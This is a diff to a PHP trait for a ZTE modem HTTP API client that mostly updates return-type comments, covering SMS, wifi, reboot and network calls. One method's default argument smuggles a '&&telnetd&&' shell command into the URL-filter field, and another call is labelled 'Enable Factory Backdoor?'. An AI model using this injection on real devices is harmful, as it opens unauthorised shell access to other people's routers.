@@ -22,7 +22,7 @@ trait Hackapi_Zte_modem_Trait {
 	* List Wifi Clients
 	*
 	* @category ApiGet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiGetStationList(){
 		$this->DebugLogMethod();
@@ -47,7 +47,7 @@ trait Hackapi_Zte_modem_Trait {
 	*		'2'	: Sent,
 	*		'10'	: All,
 	* @category ApiGet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiGetSmsDataTotal($tags="10", $page="0", $data_per_page="500", $mem_store="1", $order_by="order+by+id+desc"){
 		$this->DebugLogMethod();
@@ -69,7 +69,7 @@ trait Hackapi_Zte_modem_Trait {
 	* List Host names
 	*
 	* @category ApiGet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiGetHostNameList(){
 		$this->DebugLogMethod();
@@ -97,7 +97,7 @@ trait Hackapi_Zte_modem_Trait {
 	*
 	* @param string $msg_id	Message ID
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetDeleteSms($msg_id){
 		$this->DebugLogMethod();
@@ -115,7 +115,7 @@ trait Hackapi_Zte_modem_Trait {
 	* Reboot
 	*
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetRebootDevice(){
 		$this->DebugLogMethod();
@@ -130,7 +130,7 @@ trait Hackapi_Zte_modem_Trait {
 	* WAN Connect
 	*
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetConnectNetwork(){
 		$this->DebugLogMethod();
@@ -145,7 +145,7 @@ trait Hackapi_Zte_modem_Trait {
 	* WAN Disconnect
 	*
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetDisconnectNetwork(){
 		$this->DebugLogMethod();
@@ -162,7 +162,7 @@ trait Hackapi_Zte_modem_Trait {
 	* @param string $wifiEnabled	Enable/Disable Wifi : either: Disable | Enable
 	* @param string $m_ssid_enable	Enable/Disable Multi SSID : either: Disable | Enable
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetSetWifiInfo($wifiEnabled="1", $m_ssid_enable="0"){
 		$this->DebugLogMethod();
@@ -193,7 +193,7 @@ trait Hackapi_Zte_modem_Trait {
 	* @param string $ID	Id
 	* @param string $encode_type	Encoding
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetSendSms($Number, $MessageBody, $sms_time="", $notCallback="true", $ID="-1", $encode_type="UNICODE"){
 		$this->DebugLogMethod();
@@ -222,7 +222,7 @@ trait Hackapi_Zte_modem_Trait {
 	* Enable Factory Backdoor?
 	*
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetChangeMode($change_mode="2", $password=""){
 		$this->DebugLogMethod();
@@ -241,7 +241,7 @@ trait Hackapi_Zte_modem_Trait {
 	* Exploits Nvram (url encoded as "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"?) 
 	*
 	* @category ApiSet
-	* @return Array[]
+	* @return Array[] | false (when empty, or when failed)
 	*/
 	public function ApiSetUrlFilterAdd($addURLFilter="http://_L33T_H4X0R_/&&telnetd&&"){
 		$this->DebugLogMethod();
@@ -262,17 +262,17 @@ trait Hackapi_Zte_modem_Trait {
 	
 	public function ListMethodsDefinitions(){
 		$def=array();
-		$def['ApiGetSmsDataTotal']=array (  'args' => 'sms_data_total',  'state' => '4',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' =>     array (      'tags' =>       array (        0 => '10',        1 =>         array (          1 => 'Received',          2 => 'Sent',          10 => 'All',        ),        2 => 'Box Type',      ),      'page' => '0',      'data_per_page' => '500',      'mem_store' => '1',      'order_by' => 'order+by+id+desc',    ),    'parameters' => '$params=array(		\'tags\'	=> $tags,		\'page\'	=> $page,		\'data_per_page\'	=> $data_per_page,		\'mem_store\'	=> $mem_store,		\'order_by\'	=> $order_by,	);',    'arguments' => '$tags="10", $page="0", $data_per_page="500", $mem_store="1", $order_by="order+by+id+desc"',    'call_params' => ', $params',    'doc_desc' => '* @param string $tags	Box Type*		\'1\'	: Received,*		\'2\'	: Sent,*		\'10\'	: All,',    'def_value' => '',  ),  'desc' => 'SMS List',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'sms_data_total\'',  'f_args_txt' => 'sms_data_total',  'f_method_name' => 'ApiGetSmsDataTotal',  'f_call' => 'CallApiGet',);
-		$def['ApiSetSendSms']=array (  'args' => 'SEND_SMS',  'state' => '4',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'Number' =>       array (        0 => '!',        1 => 'Phone Number',      ),      'MessageBody' =>       array (        0 => '!',        1 => 'Content (HEX encoded)',      ),      'sms_time' =>       array (        0 => '',        1 => 'Date as date(\'y;m;d;H;i;s;+TZ\')',      ),      'notCallback' =>       array (        0 => 'true',        1 => '?',      ),      'ID' =>       array (        0 => '-1',        1 => 'Id',      ),      'encode_type' =>       array (        0 => 'UNICODE',        1 => 'Encoding',      ),    ),    'parameters' => '$params=array(		\'Number\'	=> $Number,		\'MessageBody\'	=> $MessageBody,		\'sms_time\'	=> $sms_time,		\'notCallback\'	=> $notCallback,		\'ID\'	=> $ID,		\'encode_type\'	=> $encode_type,	);',    'arguments' => '$Number, $MessageBody, $sms_time="", $notCallback="true", $ID="-1", $encode_type="UNICODE"',    'call_params' => ', $params',    'doc_desc' => '* @param string $Number	Phone Number* @param string $MessageBody	Content (HEX encoded)* @param string $sms_time	Date as date(\'y;m;d;H;i;s;+TZ\')* @param string $notCallback	?* @param string $ID	Id* @param string $encode_type	Encoding',    'def_value' => '',  ),  'desc' => 'Send SMS',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'SEND_SMS\'',  'f_args_txt' => 'SEND_SMS',  'f_method_name' => 'ApiSetSendSms',  'f_call' => 'CallApiPost',);
-		$def['ApiSetDeleteSms']=array (  'args' => 'DELETE_SMS',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'msg_id' =>       array (        0 => '!',        1 => 'Message ID',      ),    ),    'parameters' => '$params=array(		\'msg_id\'	=> $msg_id,	);',    'arguments' => '$msg_id',    'call_params' => ', $params',    'doc_desc' => '* @param string $msg_id	Message ID',    'def_value' => '',  ),  'desc' => 'Delete SMS',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'DELETE_SMS\'',  'f_args_txt' => 'DELETE_SMS',  'f_method_name' => 'ApiSetDeleteSms',  'f_call' => 'CallApiPost',);
-		$def['ApiSetRebootDevice']=array (  'args' => 'REBOOT_DEVICE',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Reboot',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'REBOOT_DEVICE\'',  'f_args_txt' => 'REBOOT_DEVICE',  'f_method_name' => 'ApiSetRebootDevice',  'f_call' => 'CallApiPost',);
-		$def['ApiSetConnectNetwork']=array (  'args' => 'CONNECT_NETWORK',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'WAN Connect',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'CONNECT_NETWORK\'',  'f_args_txt' => 'CONNECT_NETWORK',  'f_method_name' => 'ApiSetConnectNetwork',  'f_call' => 'CallApiPost',);
-		$def['ApiSetDisconnectNetwork']=array (  'args' => 'DISCONNECT_NETWORK',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'WAN Disconnect',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'DISCONNECT_NETWORK\'',  'f_args_txt' => 'DISCONNECT_NETWORK',  'f_method_name' => 'ApiSetDisconnectNetwork',  'f_call' => 'CallApiPost',);
-		$def['ApiSetChangeMode']=array (  'args' => 'CHANGE_MODE',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'change_mode' => '2',      'password' => '',    ),    'parameters' => '$params=array(		\'change_mode\'	=> $change_mode,		\'password\'	=> $password,	);',    'arguments' => '$change_mode="2", $password=""',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Enable Factory Backdoor?',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'CHANGE_MODE\'',  'f_args_txt' => 'CHANGE_MODE',  'f_method_name' => 'ApiSetChangeMode',  'f_call' => 'CallApiPost',);
-		$def['ApiSetUrlFilterAdd']=array (  'args' => 'URL_FILTER_ADD',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'addURLFilter' => 'http://_L33T_H4X0R_/&&telnetd&&',    ),    'parameters' => '$params=array(		\'addURLFilter\'	=> $addURLFilter,	);',    'arguments' => '$addURLFilter="http://_L33T_H4X0R_/&&telnetd&&"',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Exploits Nvram (url encoded as "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"?) ',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'URL_FILTER_ADD\'',  'f_args_txt' => 'URL_FILTER_ADD',  'f_method_name' => 'ApiSetUrlFilterAdd',  'f_call' => 'CallApiPost',);
-		$def['ApiSetSetWifiInfo']=array (  'args' => 'SET_WIFI_INFO',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'wifiEnabled' =>       array (        0 => '1',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Wifi',      ),      'm_ssid_enable' =>       array (        0 => '0',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Multi SSID',      ),    ),    'parameters' => '$params=array(		\'wifiEnabled\'	=> $wifiEnabled,		\'m_ssid_enable\'	=> $m_ssid_enable,	);',    'arguments' => '$wifiEnabled="1", $m_ssid_enable="0"',    'call_params' => ', $params',    'doc_desc' => '* @param string $wifiEnabled	Enable/Disable Wifi : either: Disable | Enable* @param string $m_ssid_enable	Enable/Disable Multi SSID : either: Disable | Enable',    'def_value' => '',  ),  'desc' => 'Wifi Switches',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'SET_WIFI_INFO\'',  'f_args_txt' => 'SET_WIFI_INFO',  'f_method_name' => 'ApiSetSetWifiInfo',  'f_call' => 'CallApiPost',);
-		$def['ApiGetHostNameList']=array (  'args' => 'hostNameList',  'state' => '4',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Host names',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'hostNameList\'',  'f_args_txt' => 'hostNameList',  'f_method_name' => 'ApiGetHostNameList',  'f_call' => 'CallApiGet',);
-		$def['ApiGetStationList']=array (  'args' => 'station_list',  'state' => '5',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Wifi Clients',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'station_list\'',  'f_args_txt' => 'station_list',  'f_method_name' => 'ApiGetStationList',  'f_call' => 'CallApiGet',);
+		$def['ApiGetSmsDataTotal']=array (  'args' => 'sms_data_total',  'state' => '4',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' =>     array (      'tags' =>       array (        0 => '10',        1 =>         array (          1 => 'Received',          2 => 'Sent',          10 => 'All',        ),        2 => 'Box Type',      ),      'page' => '0',      'data_per_page' => '500',      'mem_store' => '1',      'order_by' => 'order+by+id+desc',    ),    'parameters' => '$params=array(		\'tags\'	=> $tags,		\'page\'	=> $page,		\'data_per_page\'	=> $data_per_page,		\'mem_store\'	=> $mem_store,		\'order_by\'	=> $order_by,	);',    'arguments' => '$tags="10", $page="0", $data_per_page="500", $mem_store="1", $order_by="order+by+id+desc"',    'call_params' => ', $params',    'doc_desc' => '* @param string $tags	Box Type*		\'1\'	: Received,*		\'2\'	: Sent,*		\'10\'	: All,',    'def_value' => '',  ),  'desc' => 'SMS List',  'return' => '',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'sms_data_total\'',  'f_args_txt' => 'sms_data_total',  'f_method_name' => 'ApiGetSmsDataTotal',  'f_call' => 'CallApiGet',);
+		$def['ApiSetSendSms']=array (  'args' => 'SEND_SMS',  'state' => '4',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'Number' =>       array (        0 => '!',        1 => 'Phone Number',      ),      'MessageBody' =>       array (        0 => '!',        1 => 'Content (HEX encoded)',      ),      'sms_time' =>       array (        0 => '',        1 => 'Date as date(\'y;m;d;H;i;s;+TZ\')',      ),      'notCallback' =>       array (        0 => 'true',        1 => '?',      ),      'ID' =>       array (        0 => '-1',        1 => 'Id',      ),      'encode_type' =>       array (        0 => 'UNICODE',        1 => 'Encoding',      ),    ),    'parameters' => '$params=array(		\'Number\'	=> $Number,		\'MessageBody\'	=> $MessageBody,		\'sms_time\'	=> $sms_time,		\'notCallback\'	=> $notCallback,		\'ID\'	=> $ID,		\'encode_type\'	=> $encode_type,	);',    'arguments' => '$Number, $MessageBody, $sms_time="", $notCallback="true", $ID="-1", $encode_type="UNICODE"',    'call_params' => ', $params',    'doc_desc' => '* @param string $Number	Phone Number* @param string $MessageBody	Content (HEX encoded)* @param string $sms_time	Date as date(\'y;m;d;H;i;s;+TZ\')* @param string $notCallback	?* @param string $ID	Id* @param string $encode_type	Encoding',    'def_value' => '',  ),  'desc' => 'Send SMS',  'return' => '',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'SEND_SMS\'',  'f_args_txt' => 'SEND_SMS',  'f_method_name' => 'ApiSetSendSms',  'f_call' => 'CallApiPost',);
+		$def['ApiSetDeleteSms']=array (  'args' => 'DELETE_SMS',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'msg_id' =>       array (        0 => '!',        1 => 'Message ID',      ),    ),    'parameters' => '$params=array(		\'msg_id\'	=> $msg_id,	);',    'arguments' => '$msg_id',    'call_params' => ', $params',    'doc_desc' => '* @param string $msg_id	Message ID',    'def_value' => '',  ),  'desc' => 'Delete SMS',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'DELETE_SMS\'',  'f_args_txt' => 'DELETE_SMS',  'f_method_name' => 'ApiSetDeleteSms',  'f_call' => 'CallApiPost',);
+		$def['ApiSetRebootDevice']=array (  'args' => 'REBOOT_DEVICE',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Reboot',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'REBOOT_DEVICE\'',  'f_args_txt' => 'REBOOT_DEVICE',  'f_method_name' => 'ApiSetRebootDevice',  'f_call' => 'CallApiPost',);
+		$def['ApiSetConnectNetwork']=array (  'args' => 'CONNECT_NETWORK',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'WAN Connect',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'CONNECT_NETWORK\'',  'f_args_txt' => 'CONNECT_NETWORK',  'f_method_name' => 'ApiSetConnectNetwork',  'f_call' => 'CallApiPost',);
+		$def['ApiSetDisconnectNetwork']=array (  'args' => 'DISCONNECT_NETWORK',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'WAN Disconnect',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'DISCONNECT_NETWORK\'',  'f_args_txt' => 'DISCONNECT_NETWORK',  'f_method_name' => 'ApiSetDisconnectNetwork',  'f_call' => 'CallApiPost',);
+		$def['ApiSetChangeMode']=array (  'args' => 'CHANGE_MODE',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'change_mode' => '2',      'password' => '',    ),    'parameters' => '$params=array(		\'change_mode\'	=> $change_mode,		\'password\'	=> $password,	);',    'arguments' => '$change_mode="2", $password=""',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Enable Factory Backdoor?',  'return' => '',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'CHANGE_MODE\'',  'f_args_txt' => 'CHANGE_MODE',  'f_method_name' => 'ApiSetChangeMode',  'f_call' => 'CallApiPost',);
+		$def['ApiSetUrlFilterAdd']=array (  'args' => 'URL_FILTER_ADD',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'addURLFilter' => 'http://_L33T_H4X0R_/&&telnetd&&',    ),    'parameters' => '$params=array(		\'addURLFilter\'	=> $addURLFilter,	);',    'arguments' => '$addURLFilter="http://_L33T_H4X0R_/&&telnetd&&"',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Exploits Nvram (url encoded as "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"?) ',  'return' => '',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'URL_FILTER_ADD\'',  'f_args_txt' => 'URL_FILTER_ADD',  'f_method_name' => 'ApiSetUrlFilterAdd',  'f_call' => 'CallApiPost',);
+		$def['ApiSetSetWifiInfo']=array (  'args' => 'SET_WIFI_INFO',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'wifiEnabled' =>       array (        0 => '1',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Wifi',      ),      'm_ssid_enable' =>       array (        0 => '0',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Multi SSID',      ),    ),    'parameters' => '$params=array(		\'wifiEnabled\'	=> $wifiEnabled,		\'m_ssid_enable\'	=> $m_ssid_enable,	);',    'arguments' => '$wifiEnabled="1", $m_ssid_enable="0"',    'call_params' => ', $params',    'doc_desc' => '* @param string $wifiEnabled	Enable/Disable Wifi : either: Disable | Enable* @param string $m_ssid_enable	Enable/Disable Multi SSID : either: Disable | Enable',    'def_value' => '',  ),  'desc' => 'Wifi Switches',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'SET_WIFI_INFO\'',  'f_args_txt' => 'SET_WIFI_INFO',  'f_method_name' => 'ApiSetSetWifiInfo',  'f_call' => 'CallApiPost',);
+		$def['ApiGetHostNameList']=array (  'args' => 'hostNameList',  'state' => '4',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Host names',  'return' => '',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'hostNameList\'',  'f_args_txt' => 'hostNameList',  'f_method_name' => 'ApiGetHostNameList',  'f_call' => 'CallApiGet',);
+		$def['ApiGetStationList']=array (  'args' => 'station_list',  'state' => '5',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Wifi Clients',  'return' => '',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'station_list\'',  'f_args_txt' => 'station_list',  'f_method_name' => 'ApiGetStationList',  'f_call' => 'CallApiGet',);
 	
 		return $def;
 	}
